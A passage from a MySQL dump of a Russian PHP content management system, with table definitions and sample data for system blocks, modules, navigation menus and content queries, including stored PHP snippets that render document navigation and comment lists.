1\r\n")\r\n->fetchRow();\r\n\r\n$row_next = $AVE_DB->Query("\r\n	SELECT\r\n		doc.Id,\r\n		Titel,\r\n		Inhalt\r\n	FROM\r\n		cp_documents AS doc\r\n	JOIN\r\n		cp_document_fields AS fld\r\n			ON DokumentId = doc.Id\r\n	WHERE\r\n		doc.Id > ''2'' AND\r\n		doc.Id != ''" . $curent_doc_id . "'' AND\r\n		RubrikId = ''" . $row_cur->RubrikId . "'' AND\r\n		DokStart >= ''" . $row_cur->DokStart . "'' AND \r\n		RubrikFeld = ''" . $row_cur->Id . "''\r\n	ORDER BY\r\n		DokStart ASC\r\n	LIMIT 1\r\n")\r\n->fetchRow();\r\n\r\necho ''<table cellspacing="0" cellpadding="0" border="0" width="100%" id="docnavi"><tr><td align="left" width="50%" class="naviprev">'';\r\nif ($row_prev)\r\n{\r\n	$prev_url = ''index.php?id='' . $row_prev->Id . ''&'' . ''amp;doc='' . cpParseLinkname($row_prev->Titel);\r\n	$prev_url = (CP_REWRITE==1) ? cpRewrite($prev_url) : $prev_url;\r\n	$prev_linkname = htmlspecialchars($row_prev->Inhalt);\r\n	echo ''&larr;&nbsp;<a title="'', $prev_linkname, ''" href="'', $prev_url, ''">'', $prev_linkname, ''</a>''; \r\n}\r\necho ''</td><td align="right" width="50%" class="navinext">'';\r\nif ($row_next)\r\n{\r\n	$next_url = ''index.php?id='' . $row_next->Id . ''&'' . ''amp;doc='' . cpParseLinkname($row_next->Titel);\r\n	$next_url = (CP_REWRITE==1) ? cpRewrite($next_url) : $next_url;\r\n	$next_linkname = htmlspecialchars($row_next->Inhalt);\r\n	echo ''<a title="'', $next_linkname, ''" href="'', $next_url, ''">'', $next_linkname, ''</a>&nbsp;&rarr;''; \r\n}\r\necho ''</td></tr></table>'';\r\n?>');
INSERT INTO `cp_modul_sysblock` VALUES (19, 'Навигация по документам рубрики 4', '<?php\r\nglobal $db;\r\n\r\n$curent_doc_id = currentDocId();\r\n\r\n$row_prev = $db->Query("\r\n	SELECT\r\n		''prev'' AS doc_type,\r\n		prev.Id,\r\n		prev.Titel,\r\n		doc_field.Inhalt\r\n	FROM\r\n		" . PREFIX . "_documents AS prev\r\n	LEFT JOIN \r\n		" . PREFIX . "_documents AS curent \r\n			ON curent.RubrikId = prev.RubrikId\r\n	LEFT JOIN \r\n		" . PREFIX . "_document_fields AS doc_field \r\n			ON doc_field.DokumentId = prev.Id\r\n	WHERE\r\n		prev.Id >  ''2'' AND\r\n		curent.Id =  ''" . $curent_doc_id . "'' AND\r\n		prev.Id <>  ''" . $curent_doc_id . "'' AND\r\n		prev.DokStart <=  curent.DokStart AND\r\n		doc_field.RubrikFeld = (\r\n			SELECT\r\n				rub_field.Id\r\n			FROM\r\n				" . PREFIX . "_document_fields AS doc_field\r\n			LEFT JOIN \r\n				" . PREFIX . "_rubric_fields AS rub_field \r\n					ON rub_field.Id = doc_field.RubrikFeld\r\n			WHERE\r\n				doc_field.DokumentId =  ''" . $curent_doc_id . "''\r\n			ORDER BY\r\n				rub_field.rubric_position ASC\r\n			LIMIT 1\r\n		)\r\n	ORDER BY\r\n		prev.DokStart DESC\r\n	LIMIT 1\r\n")\r\n->fetchRow();\r\n\r\n$row_next = $db->Query("\r\n	SELECT\r\n		''next'' AS doc_type,\r\n		next.Id,\r\n		next.Titel,\r\n		doc_field.Inhalt\r\n	FROM\r\n		" . PREFIX . "_documents AS next\r\n	LEFT JOIN \r\n		" . PREFIX . "_documents AS curent \r\n			ON curent.RubrikId = next.RubrikId\r\n	LEFT JOIN \r\n		" . PREFIX . "_document_fields AS doc_field \r\n			ON doc_field.DokumentId = next.Id\r\n	WHERE\r\n		next.Id >  ''2'' AND\r\n		curent.Id =  ''" . $curent_doc_id . "'' AND\r\n		next.Id <>  ''" . $curent_doc_id . "'' AND\r\n		next.DokStart >=  curent.DokStart AND\r\n		doc_field.RubrikFeld = (\r\n			SELECT\r\n				rub_field.Id\r\n			FROM\r\n				" . PREFIX . "_document_fields AS doc_field\r\n			LEFT JOIN \r\n				" . PREFIX . "_rubric_fields AS rub_field \r\n					ON rub_field.Id = doc_field.RubrikFeld\r\n			WHERE\r\n				doc_field.DokumentId =  ''" . $curent_doc_id . "''\r\n			ORDER BY\r\n				rub_field.rubric_position ASC\r\n			LIMIT 1\r\n		)\r\n	ORDER BY\r\n		next.DokStart ASC\r\n	LIMIT 1\r\n")\r\n->fetchRow();\r\n\r\necho ''<table cellspacing="0" cellpadding="0" border="0" width="100%" id="docnavi"><tr><td align="left" width="50%" class="naviprev">'';\r\nif ($row_prev)\r\n{\r\n	$prev_url = ''index.php?id='' . $row_prev->Id . ''&'' . ''amp;doc='' . cpParseLinkname($row_prev->Titel);\r\n	$prev_url = (CP_REWRITE==1) ? cpRewrite($prev_url) : $prev_url;\r\n	$prev_linkname = htmlspecialchars($row_prev->Inhalt);\r\n	echo ''&larr;&nbsp;<a title="'', $prev_linkname, ''" href="'', $prev_url, ''">'', $prev_linkname, ''</a>''; \r\n}\r\necho ''</td><td align="right" width="50%" class="navinext">'';\r\nif ($row_next)\r\n{\r\n	$next_url = ''index.php?id='' . $row_next->Id . ''&'' . ''amp;doc='' . cpParseLinkname($row_next->Titel);\r\n	$next_url = (CP_REWRITE==1) ? cpRewrite($next_url) : $next_url;\r\n	$next_linkname = htmlspecialchars($row_next->Inhalt);\r\n	echo ''<a title="'', $next_linkname, ''" href="'', $next_url, ''">'', $next_linkname, ''</a>&nbsp;&rarr;''; \r\n}\r\necho ''</td></tr></table>'';\r\n?>');
INSERT INTO `cp_modul_sysblock` VALUES (20, 'Блоки 1,2,3', '<!-- Блок популярных новостей -->\r\n<div class="box">\r\n<h2><a href="#" id="toggle-popnews">Популярные новости</a></h2>\r\n<div id="popnews" class="block"><?php\r\n$limit = 3; // Количество новостей в списке\r\n$i = 0;\r\n$sql = $AVE_DB->Query("\r\n	SELECT \r\n		COUNT(cmnt.Id) AS comments, \r\n		doc.Id, \r\n		doc.Titel, \r\n		doc.Url \r\n	FROM " . PREFIX . "_modul_comment_info AS cmnt\r\n	JOIN " . PREFIX . "_documents AS doc ON doc.Id = cmnt.document_id\r\n	GROUP BY cmnt.document_id \r\n	ORDER BY comments DESC \r\n	LIMIT " . $limit\r\n);\r\nwhile ($row = $sql->fetchrow())\r\n{\r\n	$Url = ''index.php?id='' . $row->Id . ''&amp;doc='' \r\n		. (empty($row->Url) ? translit_string($row->Titel) : $row->Url);\r\n	$Url = REWRITE_MODE ? rewrite_link($Url) : $Url;\r\n	echo ''<p><strong>'', ++$i, ''.</strong> <a href="'', $Url, ''">'', \r\n		htmlspecialchars(substr($row->Titel, 0, 36), ENT_QUOTES), \r\n		((strlen($row->Titel)>36) ? ''...'' : ''''), \r\n		''</a><small style="text-align:right;">(Комментариев: '', \r\n		$row->comments, '')</small></p>'';\r\n}\r\n?></div>\r\n</div>\r\n<!-- Блок активные комментаторы -->\r\n<div class="box">\r\n<h2><a href="#" id="toggle-popcommentors">Активные комментаторы</a></h2>\r\n<div id="popcommentors" class="block"><?php\r\n$limit = 5;\r\n$i = 0;\r\n$sql = $AVE_DB->Query("\r\n	SELECT \r\n		author_name, \r\n		COUNT(author_id) AS comments\r\n	FROM " . PREFIX . "_modul_comment_info\r\n	WHERE author_id != ''0''\r\n	GROUP BY author_id\r\n	ORDER BY comments DESC\r\n	LIMIT " . $limit\r\n);\r\nwhile ($row = $sql->fetchrow())\r\n{\r\n	echo ''<p><strong>'', ++$i, '' место:</strong> '', \r\n		htmlspecialchars($row->author_name, ENT_QUOTES),\r\n		''<small style="text-align:right;">(Комментариев: '',\r\n		$row->comments, '')</small></p>'';\r\n}\r\n?></div>\r\n</div>\r\n<!-- Блок Последние комментарии -->\r\n<div class="box">\r\n<h2><a href="#" id="toggle-lastcomments">Последние комментарии</a></h2>\r\n<div id="lastcomments" class="block"><?php\r\n$limit = 3;\r\n$sql = $AVE_DB->Query("\r\n	SELECT \r\n		cmnt.author_name, \r\n		LEFT(cmnt.message, 150) AS comment, \r\n		cmnt.published,\r\n		doc.Id,\r\n		doc.Titel, \r\n		doc.Url \r\n	FROM " . PREFIX . "_modul_comment_info AS cmnt \r\n	JOIN " . PREFIX . "_documents AS doc ON doc.Id = cmnt.document_id\r\n	WHERE status = 1\r\n	ORDER BY cmnt.Id DESC \r\n	LIMIT " . $limit\r\n);\r\nwhile ($row = $sql->fetchrow())\r\n{\r\n	$Url = ''index.php?id='' . $row->Id . ''&amp;doc='' \r\n		. (empty($row->Url) ? translit_string($row->Titel) : $row->Url);\r\n	$Url = REWRITE_MODE ? rewrite_link($Url) : $Url;\r\n	echo ''<p><small>Ответил:'', htmlspecialchars($row->author_name), '' • '', \r\n		pretty_date(strftime(TIME_FORMAT,$row->published), DEFAULT_LANGUAGE),\r\n		''</small><a title="'', htmlspecialchars($row->Titel, ENT_QUOTES),\r\n		''"href="'', $Url, ''"><em>"'', htmlspecialchars($row->comment, ENT_QUOTES), \r\n		(strlen($row->comment)==150 ? ''...'' : ''''), ''"</em></a></p><hr/>'';\r\n}\r\n?></div>\r\n</div>');
INSERT INTO `cp_modul_sysblock` VALUES (21, 'Тестовый блок', '<p>Проверка</p>');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_who_is_online`
-- 

CREATE TABLE `cp_modul_who_is_online` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `ip` int(11) NOT NULL default '0',
  `country` char(64) NOT NULL default '',
  `countrycode` char(2) NOT NULL default '',
  `city` char(64) NOT NULL default '',
  `dt` timestamp NOT NULL default CURRENT_TIMESTAMP,
  PRIMARY KEY  (`id`),
  UNIQUE KEY `ip` (`ip`),
  KEY `countrycode` (`countrycode`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_who_is_online`
-- 

INSERT INTO `cp_modul_who_is_online` VALUES (1, 2130706433, '(Private Address)', 'XX', '(Private Address)', '2010-07-08 23:47:21');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_module`
-- 

CREATE TABLE `cp_module` (
  `Id` smallint(3) unsigned NOT NULL auto_increment,
  `ModulName` char(50) NOT NULL,
  `Status` enum('1','0') NOT NULL default '1',
  `CpEngineTag` char(255) NOT NULL,
  `CpPHPTag` char(255) NOT NULL,
  `ModulFunktion` char(255) NOT NULL,
  `IstFunktion` enum('1','0') NOT NULL default '1',
  `ModulPfad` char(50) NOT NULL,
  `Version` char(20) NOT NULL default '1.0',
  `Template` smallint(3) unsigned NOT NULL default '1',
  `AdminEdit` enum('0','1') NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `ModulName` (`ModulName`)
) ENGINE=MyISAM AUTO_INCREMENT=18 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_module`
-- 

INSERT INTO `cp_module` VALUES (1, 'Download', '1', '', '', '', '0', 'download', '2.0', 1, '1');
INSERT INTO `cp_module` VALUES (2, 'Who is online', '1', '#\\[mod_online]#', '<?php mod_online(); ?>', 'mod_online', '1', 'whoisonline', '1.0', 0, '0');
INSERT INTO `cp_module` VALUES (3, 'Авторизация', '1', '#\\[mod_login]#', '<?php mod_login(); ?>', 'mod_login', '1', 'login', '2.2', 1, '1');
INSERT INTO `cp_module` VALUES (4, 'Архив документов', '1', '#\\[mod_newsarchive:(\\d+)]#', '<?php mod_newsarchive(''$1''); ?>', 'mod_newsarchive', '1', 'newsarchive', '1.1', 1, '1');
INSERT INTO `cp_module` VALUES (5, 'Баннер', '1', '#\\[mod_banner:(\\d+)]#', '<?php mod_banner(''$1''); ?>', 'mod_banner', '1', 'media', '1.3', 0, '1');
INSERT INTO `cp_module` VALUES (6, 'Вопрос/ответ', '1', '#\\[mod_faq:(\\d+)]#', '<?php mod_faq(''$1''); ?>', 'mod_faq', '1', 'faq', '1.0', 0, '1');
INSERT INTO `cp_module` VALUES (7, 'Галерея', '1', '#\\[mod_gallery:([\\d-]+)]#', '<?php mod_gallery(''$1''); ?>', 'mod_gallery', '1', 'gallery', '2.2', 0, '1');
INSERT INTO `cp_module` VALUES (8, 'Карта сайта', '1', '#\\[mod_sitemap:([\\d,]*)]#', '<?php mod_sitemap(''$1''); ?>', 'mod_sitemap', '1', 'sitemap', '1.0', 0, '0');
INSERT INTO `cp_module` VALUES (9, 'Комментарии', '1', '#\\[mod_comment]#', '<?php mod_comment(); ?>', 'mod_comment', '1', 'comment', '1.2', 0, '1');
INSERT INTO `cp_module` VALUES (10, 'Контакты', '1', '#\\[mod_contact:(\\d+)]#', '<?php mod_contact(''$1''); ?>', 'mod_contact', '1', 'contact', '2.3', 0, '1');
INSERT INTO `cp_module` VALUES (11, 'Магазин', '1', '', '', '', '0', 'shop', '1.4', 2, '1');
INSERT INTO `cp_module` VALUES (12, 'Навигация', '1', '#\\[mod_navigation:(\\d+)]#', '<?php mod_navigation(''$1''); ?>', 'mod_navigation', '1', 'navigation', '1.2', 0, '0');
INSERT INTO `cp_module` VALUES (13, 'Опросы', '1', '#\\[mod_poll:(\\d+)]#', '<?php mod_poll(''$1''); ?>', 'mod_poll', '1', 'poll', '1.0', 1, '1');
INSERT INTO `cp_module` VALUES (14, 'Поиск', '1', '#\\[mod_search]#', '<?php mod_search(); ?>', 'mod_search', '1', 'search', '2.0', 1, '1');
INSERT INTO `cp_module` VALUES (15, 'Рекомендовать', '1', '#\\[mod_recommend]#', '<?php mod_recommend(); ?>', 'mod_recommend', '1', 'recommend', '1.0', 0, '0');
INSERT INTO `cp_module` VALUES (16, 'Системные блоки', '1', '#\\[mod_sysblock:(\\d+)]#', '<?php mod_sysblock(''$1''); ?>', 'mod_sysblock', '1', 'sysblock', '1.1', 0, '1');
INSERT INTO `cp_module` VALUES (17, 'Форумы', '1', '', '', '', '0', 'forums', '1.2', 3, '1');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_navigation`
-- 

CREATE TABLE `cp_navigation` (
  `id` smallint(3) unsigned NOT NULL auto_increment,
  `navi_titel` varchar(255) NOT NULL,
  `navi_level1` text NOT NULL,
  `navi_level2` text NOT NULL,
  `navi_level3` text NOT NULL,
  `navi_level1active` text NOT NULL,
  `navi_level2active` text NOT NULL,
  `navi_level3active` text NOT NULL,
  `navi_level1begin` text NOT NULL,
  `navi_level1end` text NOT NULL,
  `navi_level2begin` text NOT NULL,
  `navi_level2end` text NOT NULL,
  `navi_level3begin` text NOT NULL,
  `navi_level3end` text NOT NULL,
  `navi_begin` text NOT NULL,
  `navi_end` text NOT NULL,
  `navi_user_group` text NOT NULL,
  `navi_expand` enum('0','1') NOT NULL default '0',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_navigation`
-- 

INSERT INTO `cp_navigation` VALUES (1, 'Вертикальное меню', '<li><a href=''[tag:link]'' title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></li>', '<li><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></li>', '<li><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></li>', '<li class=''active''><b><a target=''[tag:target]'' href="[tag:link]">[tag:linkname]</a></b></li>\r\n', '<li class="active"><b><a target="[tag:target]" href="[tag:link]" title="[tag:linkname]">[tag:linkname]</a></b></li>\r\n', '<li><b><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></b></li>', '<ul class="menu_v" style="margin-bottom:0;">', '</ul>', '<ul>', '</ul>', '<ul>', '</ul>', '<!-- vnavi -->', '<!-- /vnavi -->', '1,2,3,4', '0');
INSERT INTO `cp_navigation` VALUES (2, 'Горизонтальное меню', '<li><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></li>', '<li><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></li>', '<li><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></li>', '<li><b><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></b></li>', '<li><b><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></b></li>', '<li><b><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></b></li>', '<ul class="nav">', '</ul>', '<ul>', '</ul>', '<ul>', '</ul>', '<!-- hnavi -->', '<!-- /hnavi -->', '1,2,3,4', '0');
INSERT INTO `cp_navigation` VALUES (3, 'Горизонтальное меню ', '<li class="li-<?=$styles[$it]?>"><a class="nav-<?=$styles[$it];++$it?>" href="[tag:link]">[tag:linkname]&nbsp;&nbsp;<img src="templates/elle/images/bg-menu-head-a.png" width="9" height="10" border="0" alt="" /></a>', '<li><a style="padding-left: 15px; background-position: 0px 12px;" href="[tag:link]">[tag:linkname]</a></li>', '<li><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></li>', '<li class="li-<?=$styles[$it]?>"><a class="nav-<?=$styles[$it];++$it?>" href="[tag:link]">[tag:linkname]&nbsp;&nbsp;<img src="templates/elle/images/bg-menu-head-a.png" width="9" height="10" border="0" alt="" /></a>', '<li><a style="padding-left: 15px; background-position: 0px 12px;" href="[tag:link]">[tag:linkname]</a></li>', '<li><b><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></b></li>', '<ul class="sf-menu sf-js-enabled">', '</ul>', '<ul style="display: none; visibility: hidden; opacity: 0.9;">', '</ul>', '<ul>', '</ul>', '<!-- hnavi -->\r\n<?$it=0;$styles=array(''elle'',''news'',''articls'',''where'',''advert'',''contact'');?>\r\n<div class="main_menu">\r\n', '</div>\r\n<!-- /hnavi -->', '1,2,3,4', '1');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_navigation_items`
-- 

CREATE TABLE `cp_navigation_items` (
  `Id` mediumint(5) unsigned NOT NULL auto_increment,
  `title` char(255) NOT NULL,
  `parent_id` mediumint(5) unsigned NOT NULL,
  `navi_item_link` char(255) NOT NULL,
  `navi_item_target` enum('_blank','_self','_parent','_top') NOT NULL default '_self',
  `navi_item_level` enum('1','2','3') NOT NULL default '1',
  `navi_item_position` smallint(3) unsigned NOT NULL default '1',
  `navi_id` smallint(3) unsigned NOT NULL default '0',
  `navi_item_status` enum('1','0') NOT NULL default '1',
  `document_alias` char(255) NOT NULL,
  PRIMARY KEY  (`Id`),
  KEY `navi_id` (`navi_id`),
  KEY `document_alias` (`document_alias`),
  KEY `navi_item_status` (`navi_item_status`)
) ENGINE=MyISAM AUTO_INCREMENT=29 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_navigation_items`
-- 

INSERT INTO `cp_navigation_items` VALUES (1, 'Особенности шаблона', 0, 'index.php?id=16', '_self', '1', 1, 1, '1', 'osobennosti-shablona');
INSERT INTO `cp_navigation_items` VALUES (2, 'О компании', 0, 'index.php?id=3', '_self', '1', 2, 1, '1', 'о-компании');
INSERT INTO `cp_navigation_items` VALUES (3, 'Условия сделки', 0, 'index.php?id=4', '_self', '1', 3, 1, '1', 'условия-сделки');
INSERT INTO `cp_navigation_items` VALUES (4, 'Контакты', 0, 'index.php?id=5', '_self', '1', 4, 1, '1', 'kontakty');
INSERT INTO `cp_navigation_items` VALUES (5, 'Архив Новостей', 0, 'index.php?id=7', '_self', '1', 5, 1, '1', 'новости');
INSERT INTO `cp_navigation_items` VALUES (6, 'Пример галереи', 0, 'index.php?id=9', '_self', '1', 8, 1, '1', 'primer-galerei');
INSERT INTO `cp_navigation_items` VALUES (7, 'Google Maps', 0, 'index.php?id=13', '_self', '1', 10, 1, '1', 'google-maps');
INSERT INTO `cp_navigation_items` VALUES (8, 'Новость 1', 5, 'index.php?id=6', '_self', '2', 1, 1, '1', 'новости/2009-08-07/первая-тестовая-новость');
INSERT INTO `cp_navigation_items` VALUES (9, 'Новость 2', 5, 'index.php?id=8', '_self', '2', 2, 1, '1', 'новости/2009-08-15/вторая-тестовая-новость');
INSERT INTO `cp_navigation_items` VALUES (10, 'Типографика', 1, 'index.php?id=17', '_self', '2', 10, 1, '1', 'tipografika');
INSERT INTO `cp_navigation_items` VALUES (11, '960px grid system', 1, 'index.php?id=18', '_self', '2', 20, 1, '1', '960px-grid-system');
INSERT INTO `cp_navigation_items` VALUES (12, 'FAQ', 0, 'index.php?id=10', '_self', '1', 1, 2, '1', 'faq');
INSERT INTO `cp_navigation_items` VALUES (13, 'Магазин', 0, 'index.php?module=shop', '_self', '1', 2, 2, '1', 'index.php?module=shop');
INSERT INTO `cp_navigation_items` VALUES (14, 'Загрузки', 0, 'index.php?module=download', '_self', '1', 3, 2, '1', 'index.php?module=download');
INSERT INTO `cp_navigation_items` VALUES (15, 'Контакты', 0, 'index.php?id=5', '_self', '1', 4, 2, '1', 'kontakty');
INSERT INTO `cp_navigation_items` VALUES (16, 'Форум', 0, 'index.php?module=forums', '_self', '1', 5, 2, '1', 'index.php?module=forums');
INSERT INTO `cp_navigation_items` VALUES (17, 'Главная', 0, 'index.php?id=1', '_self', '1', 10, 3, '1', 'главная');
INSERT INTO `cp_navigation_items` VALUES (18, 'Типографика', 0, 'index.php?id=17', '_self', '1', 20, 3, '1', 'tipografika');
INSERT INTO `cp_navigation_items` VALUES (19, 'FAQ', 0, 'index.php?id=10', '_self', '1', 30, 3, '1', 'faq');
INSERT INTO `cp_navigation_items` VALUES (20, 'Контакты', 0, 'index.php?id=5', '_self', '1', 40, 3, '1', 'kontakty');
INSERT INTO `cp_navigation_items` VALUES (21, 'Карта сайта', 0, 'index.php?id=11', '_self', '1', 50, 3, '1', 'sitemap');
INSERT INTO `cp_navigation_items` VALUES (22, 'Пример галереи', 0, 'index.php?id=9', '_self', '1', 60, 3, '1', 'primer-galerei');
INSERT INTO `cp_navigation_items` VALUES (23, 'Первая тестовая новость', 17, 'index.php?id=6', '_self', '2', 10, 3, '1', 'новости/2009-08-07/первая-тестовая-новость');
INSERT INTO `cp_navigation_items` VALUES (24, 'Google Maps', 19, 'index.php?id=13', '_self', '2', 10, 3, '1', 'google-maps');
INSERT INTO `cp_navigation_items` VALUES (25, 'Особенности шаблона', 20, 'index.php?id=16', '_self', '2', 10, 3, '1', 'osobennosti-shablona');
INSERT INTO `cp_navigation_items` VALUES (26, 'Вторая тестовая новость', 17, 'index.php?id=8', '_self', '2', 20, 3, '1', 'новости/2009-08-15/вторая-тестовая-новость');
INSERT INTO `cp_navigation_items` VALUES (27, 'Копия морды', 19, 'index.php?id=12', '_self', '2', 20, 3, '1', 'kopiya-mordy');
INSERT INTO `cp_navigation_items` VALUES (28, 'Демонстрация тэга more', 17, 'index.php?id=14', '_self', '2', 30, 3, '1', 'новости/демонстрация-тэга-more');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_request`
-- 

CREATE TABLE `cp_request` (
  `Id` smallint(3) unsigned NOT NULL auto_increment,
  `rubric_id` smallint(3) unsigned NOT NULL,
  `request_items_per_page` smallint(3) unsigned NOT NULL,
  `request_title` varchar(255) NOT NULL,
  `request_template_item` text NOT NULL,
  `request_template_main` text NOT NULL,
  `request_order_by` varchar(255) NOT NULL,
  `request_author_id` int(10) unsigned NOT NULL default '1',
  `request_created` int(10) unsigned NOT NULL,
  `request_description` tinytext NOT NULL,
  `request_asc_desc` enum('ASC','DESC') NOT NULL default 'DESC',
  `request_show_pagination` enum('0','1') NOT NULL default '0',
  `request_where_cond` text NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_request`
-- 

INSERT INTO `cp_request` VALUES (1, 2, 3, 'Новостной запрос', '<div class="first article"> \r\n	[tag:rfld:6][250]\r\n	<h3><a href="[tag:link]">[tag:rfld:10][250]</a></h3>\r\n	<p>[tag:rfld:5][more]<a href="[tag:link]">» вся новость</a></p>\r\n	<p class="meta">[tag:docdate] • Просмотров: ([tag:docviews]) • Комментариев: ([tag:doccomments])</p>\r\n</div>\r\n\r\n', '<div>\r\n[tag:content]\r\n</div>\r\n[tag:pages]', 'document_published', 1, 1145447477, 'Выводит новости из рубрики 2', 'DESC', '1', '');
INSERT INTO `cp_request` VALUES (2, 2, 1, 'Запрос с условиями', '<div class="first article"> \r\n	[tag:rfld:6][350]\r\n	<h3><a href="[tag:link]">[tag:rfld:10][250]</a></h3>\r\n	<p>[tag:rfld:5][more]<a href="[tag:link]">» вся новость</a></p>\r\n	<p class="meta">[tag:docdate] • Просмотров: ([tag:docviews]) • Комментариев: ([tag:doccomments])</p>\r\n</div>', '<div>\r\n[tag:content]\r\n</div>\r\n[tag:pages]', 'document_published', 1, 1252877884, 'Выводит новости из рубрики 2', 'DESC', '1', 'AND a.Id = ANY(SELECT t0.document_id FROM cp_document_fields AS t0 WHERE 0 OR(t0.rubric_field_id = ''5'' AND t0.field_value LIKE ''%элонгация%'' ) OR(t0.rubric_field_id = ''5'' AND t0.field_value LIKE ''%лимб%'' ) OR(t0.rubric_field_id = ''10'' AND t0.field_value LIKE ''%дождь%'' ))');
INSERT INTO `cp_request` VALUES (3, 1, 2, 'Демонстрация тэга more', '<div class="first article"> \r\n	[tag:rfld:2][250]\r\n	<h3><a href="[tag:link]#more" title="[tag:rfld:4][-200]">[tag:rfld:4][250]</a></h3>\r\n	<p>[tag:rfld:1][more] <a href="[tag:link]">подробнее...</a></p>\r\n</div>', '[tag:content]', 'document_published', 1, 1263292589, '', 'DESC', '', '');
INSERT INTO `cp_request` VALUES (4, 3, 3, 'Статьи', '<div class="first article"> \r\n	[tag:rfld:31][999]\r\n	<h3><a href="[tag:link]">[tag:rfld:29][150]</a></h3>\r\n	<p>[tag:rfld:30][-150]<a href="[tag:link]">» вся новость</a></p>\r\n	<p class="meta">Просмотров: ([tag:docviews]) • Комментариев: ([tag:doccomments])</p>\r\n</div>\r\n\r\n', '<div>\r\n[tag:content]\r\n</div>\r\n[tag:pages]', 'document_published', 1, 1272800598, 'Выводит статьи', 'DESC', '1', '');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_request_conditions`
-- 

CREATE TABLE `cp_request_conditions` (
  `Id` mediumint(5) unsigned NOT NULL auto_increment,
  `request_id` smallint(3) unsigned NOT NULL,
  `condition_compare` char(30) NOT NULL,
  `condition_field_id` int(10) NOT NULL,
  `condition_value` char(255) NOT NULL,
  `condition_join` enum('OR','AND') NOT NULL default 'OR',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_request_conditions`
-- 

INSERT INTO `cp_request_conditions` VALUES (1, 2, '%%', 5, 'элонгация', 'OR');
INSERT INTO `cp_request_conditions` VALUES (2, 2, '%%', 5, 'лимб', 'OR');
INSERT INTO `cp_request_conditions` VALUES (3, 2, '%%', 10, 'дождь', 'OR');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_rubric_fields`
-- 

CREATE TABLE `cp_rubric_fields` (
  `Id` mediumint(5) unsigned NOT NULL auto_increment,
  `rubric_id` smallint(3) unsigned NOT NULL,
  `rubric_field_title` varchar(255) NOT NULL,
  `rubric_field_type` varchar(75) NOT NULL,
  `rubric_field_position` smallint(3) unsigned NOT NULL default '1',
  `rubric_field_default` text NOT NULL,
  `rubric_field_template` text NOT NULL,
  `rubric_field_template_request` text NOT NULL,
  PRIMARY KEY  (`Id`),
  KEY `rubric_id` (`rubric_id`)
) ENGINE=MyISAM AUTO_INCREMENT=32 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_rubric_fields`
-- 

INSERT INTO `cp_rubric_fields` VALUES (1, 1, 'Содержание', 'langtext', 3, '', '', '');
INSERT INTO `cp_rubric_fields` VALUES (2, 1, 'Изображение (справа)', 'bild', 4, '', '[tag:if_notempty]\r\n<img style="padding-left:6px" align="right" src="[tag:path]index.php?thumb=[tag:parametr:0]&amp;width=200" alt="[tag:parametr:1]" border="0" />\r\n[/tag:if_notempty]', '[tag:if_notempty]\r\n<a href="[tag:link]#more" class="image">\r\n<img style="padding-left:5px" align="right" src="[tag:path]index.php?thumb=[tag:parametr:0]&amp;width=200" alt="[tag:parametr:1]" border="0" />\r\n</a>\r\n[/tag:if_notempty]');
INSERT INTO `cp_rubric_fields` VALUES (4, 1, 'Заголовок', 'kurztext', 1, 'Заголовок по умолчанию', '', '');
INSERT INTO `cp_rubric_fields` VALUES (5, 2, 'Основной текст новости', 'langtext', 3, '', '', '');
INSERT INTO `cp_rubric_fields` VALUES (6, 2, 'Изображение', 'bild', 4, '', '[tag:if_notempty]<div class="contenticon">\r\n<img src="[cp:path]index.php?thumb=[tag:parametr:0]&amp;width=200" alt="[tag:parametr:1]" align="left" border="0" style="margin-right:.5em" />\r\n</div>[/tag:if_notempty]', '[tag:if_notempty]\r\n<a href="[tag:link]#more" class="image"><img src="[tag:path]index.php?thumb=[tag:parametr:0]" alt="[tag:parametr:1]" border="0" /></a>\r\n[/tag:if_notempty]');
INSERT INTO `cp_rubric_fields` VALUES (10, 2, 'Заголовок', 'kurztext', 1, '', '', '');
INSERT INTO `cp_rubric_fields` VALUES (29, 3, 'Заголовок', 'kurztext', 1, 'Заголовок по умолчанию', '', '');
INSERT INTO `cp_rubric_fields` VALUES (30, 3, 'Содержание', 'langtext', 3, '', '', '');
